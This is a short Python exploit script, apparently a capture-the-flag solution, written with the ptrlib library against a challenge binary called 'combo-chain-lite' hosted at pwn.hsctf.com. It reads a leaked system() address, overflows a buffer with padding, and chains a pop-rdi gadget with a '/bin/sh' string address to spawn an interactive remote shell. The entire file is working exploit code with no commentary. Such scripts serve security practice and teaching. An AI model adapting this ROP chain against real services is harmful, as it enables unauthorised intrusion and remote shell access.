from ptrlib import *

elf = ELF("./combo-chain-lite")
#sock = Process("./combo-chain-lite")
sock = Socket("pwn.hsctf.com", 3131)

rop_pop_rdi = 0x00401273

sock.recvuntil(": ")
addr_system = int(sock.recvline().rstrip(), 16)
addr_binsh = 0x402051

payload = b'A' * 0x10
payload += p64(rop_pop_rdi)
payload += p64(addr_binsh)
payload += p64(addr_system)
sock.sendline(payload)

sock.interactive()
